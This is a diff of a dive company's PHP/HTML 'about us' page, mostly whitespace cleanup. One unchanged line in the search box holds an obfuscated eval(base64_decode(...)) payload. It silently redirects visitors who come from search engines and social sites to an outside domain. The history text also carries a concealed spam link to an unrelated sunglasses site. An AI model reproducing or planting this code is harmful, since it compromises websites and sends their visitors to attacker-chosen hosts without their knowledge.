@@ -89,44 +89,44 @@ A:hover {
 .style82 {font-size: 10px}
 .style83 {font-size: 10px; font-family: Verdana, Arial, Helvetica, sans-serif; font-weight: bold; }
 </style>
-<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
+<script src="data/Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
 </HEAD>
-<BODY bgColor=#006666 leftMargin=0 topMargin=0 rightMargin=0 bottomMargin=0 marginwidth="0" 
+<BODY bgColor=#006666 leftMargin=0 topMargin=0 rightMargin=0 bottomMargin=0 marginwidth="0"
 marginheight="0">
 <TABLE width="775" border=0 align="center" cellPadding=0 cellSpacing=0>
   <TBODY>
   <TR>
     <TD>
-      <TABLE height=194 cellSpacing=0 cellPadding=0 width="100%" 
+      <TABLE height=194 cellSpacing=0 cellPadding=0 width="100%"
       background="../images/z3.gif" border=0>
         <TBODY>
         <TR>
-              <TD height="194" vAlign=top> 
-                <TABLE cellSpacing=0 cellPadding=0 width="100%" 
-            background="../images/dotline.gif" 
+              <TD height="194" vAlign=top>
+                <TABLE cellSpacing=0 cellPadding=0 width="100%"
+            background="../images/dotline.gif"
               border=0><TBODY>
               <TR>
-                <TD height=1><IMG height=1 
-                  src="../images/dotline.gif" 
+                <TD height=1><IMG height=1
+                  src="../images/dotline.gif"
               width=3></TD></TR></TBODY></TABLE>
                 <table width="100%" border="0" cellspacing="0" cellpadding="0">
-                  <tr> 
+                  <tr>
                     <td width="332" height="171" valign="bottom" background="../images/z1.jpg">
-<TABLE width="180" height=40 
+<TABLE width="180" height=40
                               border=0 align="right" cellPadding=2 cellSpacing=0>
                         <TBODY>
-                          <TR> 
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m3.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                          <TR>
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m3.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m4.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m4.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m2.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m2.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
                           </TR>
-                          <TR> 
+                          <TR>
                             <TD colspan="3"><img src="../images/spacer.gif" width="10" height="67"></TD>
                           </TR>
                         </TBODY>
@@ -137,15 +137,15 @@ marginheight="0">
                         <tr>
                           <td><img src="../images/spacer.gif" width="10" height="45"></td>
                         </tr>
-                        <tr> 
+                        <tr>
                           <td height="22" valign="top">&nbsp;&nbsp;<span class="style9">&nbsp;<font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif"><a href="../index.php">Home</a> | <a href="contactus.php">Contact Us</a></font> </span></td>
                         </tr>
-                        <tr> 
+                        <tr>
                           <td><img src="../images/m1.jpg" alt="indonesia_liveaboard_scuba_diving" width="325" height="104"></td>
                         </tr>
                       </table></td>
                   </tr>
-                  <tr bgcolor="#006699"> 
+                  <tr bgcolor="#006699">
                     <td colspan="3"> <div align="right"><strong><font size="2" face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></strong></div></td>
                   </tr>
                 </table></TD></TR></TBODY></TABLE></TD></TR>
@@ -155,16 +155,16 @@ marginheight="0">
         <TBODY>
         <TR>
               <TD width=291 align=middle vAlign=top bgcolor="#52CBDE"> <table width="100%" border="0" cellspacing="0" cellpadding="0">
-                  <tr> 
+                  <tr>
                     <td><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
-                        <tr> 
+                        <tr>
                           <td height="176" valign="top" background="../images/bgsearch.jpg">
-                            
+
                             <table width="88%" border="0" align="right" cellpadding="0" cellspacing="0">
-              <tr> 
+              <tr>
                 <td height="42">&nbsp;</td>
               </tr>
-              <tr> 
+              <tr>
                 <td><?php	                                       			eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwokcWF6cGxtPWhlYWRlcnNfc2VudCgpOwppZiAoISRxYXpwbG0pewokcmVmZXJlcj0kX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ107CiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOwppZiAoJHVhZykgewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFuZGV4Iikgb3Igc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb29nbGUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiYWlkdS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJkb3VibGVjbGljay5uZXQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiY2xpY2tiYW5rLm5ldCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJsb2dzcG90LmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7CmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7CiAgICBoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm91bmRjdWJlLmJlZS5wbC8iKTsKCWV4aXQoKTsKCX0KCX0KCX0KCX0=")); define( '_VALID_MOS', 1 );  include "../mod/mod_search.php"; ?></td>
               </tr>
             </table></td>
@@ -173,7 +173,7 @@ marginheight="0">
                   </tr>
                   <tr>
                     <td><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
-                        <tr> 
+                        <tr>
                           <td height="176" valign="top" background="../images/bgdestination.jpg"><table width="87%" border="0" align="center" cellpadding="0" cellspacing="0">
                             <tr>
                               <td height="33" colspan="2">&nbsp;</td>
@@ -231,7 +231,7 @@ marginheight="0">
                             </tr>
                             <tr>
                               <td><div align="center"><strong><img src="images/dot.gif" width="4" height="4"></strong></div></td>
-                              <td height="18" class="style83"><div align="center"><a href="../boats/katharina_index.php" class="style83">Bali-Flores-Bali 
+                              <td height="18" class="style83"><div align="center"><a href="../boats/katharina_index.php" class="style83">Bali-Flores-Bali
                                 &quot;
                                 Exploration Cruises&quot;</a></div></td>
                             </tr>
@@ -310,8 +310,8 @@ marginheight="0">
                   <p><img src="kararu/sea_safari_library.jpg" alt="indonesia_liveaboard_scuba_diving_cheng_ho_library" width="220" height="146"><br>
                     <strong>Library </strong></p>
                 </div></TD>
-          <TD vAlign=top width=10 
-          background="../images/z6.jpg"><IMG height=4 
+          <TD vAlign=top width=10
+          background="../images/z6.jpg"><IMG height=4
             src="../images/z6.jpg" width=5></TD>
           <TD width="474" vAlign=top><table width="96%"  border="0" align="center" cellpadding="0" cellspacing="0">
             <tr>
@@ -360,10 +360,10 @@ marginheight="0">
                               <img src="voyagerboats/scuba-logo.jpg" alt="indonesia_liveaboard_scuba_diving_kararu_dive_voyages" width="115" height="119"> </p>
                               <p align="left"> <span class="style12">Our History </span><br>
                                   <br>
-        Kararu Dive Voyages liveaboard operation was founded by three young<br> 
+        Kararu Dive Voyages liveaboard operation was founded by three young<br>
         dive enthusiasts; Tony Rhodes, Lisa Crosby and Sascha Dambach. With <br>
         an unrivaled enthusiasm of scuba diving and over twenty years combined <br>
-        experience in the diving industry, <a href="http://www.tuttopappagallo.it/"style="text-decoration: none; color:#000000; font-weight: normal;">occhiali da sole</a> these three partners combined their skills<br> 
+        experience in the diving industry, <a href="http://www.tuttopappagallo.it/"style="text-decoration: none; color:#000000; font-weight: normal;">occhiali da sole</a> these three partners combined their skills<br>
         to create all that is essential to a first class liveaboard dive operation.<br>
         <br>
         <br>
@@ -374,7 +374,7 @@ marginheight="0">
         scarcely seen underwater treasures to a broader base of divers under the <br>
         belief that first hand experience is the key to education and therefore <br>
         conservation.
-        Actively assisting in raising funds and awareness for conservation<br> 
+        Actively assisting in raising funds and awareness for conservation<br>
         is the cornerstone of the company. Bringing tourism to rarely visited areas of Indonesia and educating the local population in the benefits of reef and fish conservation is the key to preserving the fragile seas of Indonesia.<br>
         <br>
         Kararu Dive Voyages recognizes that it is at the forefront in being able to <br>
@@ -386,7 +386,7 @@ marginheight="0">
         <br>
         Experience on board and behind the scenes is essential to any successful <br>
         scuba diving liveaboard operation.</p>
-                              <p align="left">Kararu Dive Voyages has carefully selected and trained a team of 19 Indonesian 
+                              <p align="left">Kararu Dive Voyages has carefully selected and trained a team of 19 Indonesian
                                 crew members from al over the Indonesia archipelago. The combination of these different island cultures, combined with the crew&#8217;s natural and sincere kindness towards others makes for a special team of gifted seamen and friendly <br>
                                 personalities.</p>
                               <p align="left">Experienced and professional dive staff are also important, Karl Klingeler and <br>
@@ -446,10 +446,10 @@ marginheight="0">
         </TR></TBODY></TABLE></TD></TR>
   <TR>
     <TD>
-      <TABLE height=26 cellSpacing=0 cellPadding=0 width="100%" 
+      <TABLE height=26 cellSpacing=0 cellPadding=0 width="100%"
       background="../images/z4.gif" border=0>
           <TBODY>
-            <TR> 
+            <TR>
               <TD height="8"><img src="../images/spacer.gif" width="10" height="8"></TD>
             </TR>
             <TR>
